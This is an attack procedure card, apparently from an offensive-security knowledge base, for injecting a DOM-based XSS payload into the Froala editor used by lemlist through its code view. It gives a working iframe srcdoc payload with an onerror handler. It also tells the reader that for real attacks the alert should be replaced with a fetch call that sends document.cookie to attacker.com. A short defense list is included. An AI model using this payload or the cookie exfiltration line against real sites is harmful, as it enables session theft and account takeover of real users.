---
id: proc-938683-step3
tags:
  - payload-injection
  - html-injection
  - code-view
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:26.668Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Malicious HTML in Froala Code View

## Summary

This procedure switches the Froala editor to code view and inserts a malicious iframe payload exploiting the lack of srcdoc sanitization, setting up for DOM-based XSS execution.

## Description

Targeting the Froala WYSIWYG editor in lemlist, this step bypasses visual mode restrictions by using code view to directly input HTML. The payload uses an iframe with srcdoc containing an onerror-triggering img tag, which evades initial checks but executes on render. This is inspired by known Froala vulnerabilities like CVE-2019-19935.

## Requirements

1. Froala editor open in blank template from prior setup
2. Knowledge of HTML/JS for payload crafting
3. Browser developer tools for optional inspection

## Defense

Defensive measures and detection strategies:

- Sanitize HTML attributes like srcdoc in editor transitions
- Implement Content Security Policy (CSP) to block inline scripts and iframes
- Monitor for unusual HTML patterns in saved campaigns

## Objectives

1. Insert unsanitized HTML without rejection
2. Prepare payload for JavaScript execution on view switch
3. Avoid triggering client-side validations

## Instructions

### Step 1: Switch to Code View

**Context**: Access raw HTML editing mode in Froala.

Click the code view toggle button (often labeled "<> Code View") in the editor toolbar.

> Editor switches to plain text HTML input.

### Step 2: Insert Payload

**Context**: Add the malicious iframe to exploit srcdoc parsing.

Paste the following into the code area: `<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>`. For real attacks, replace alert with exfiltration code like `fetch('https://attacker.com?cookie='+document.cookie)`.

> Payload is accepted; apply any save button if present.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- payload-injection
- html-injection
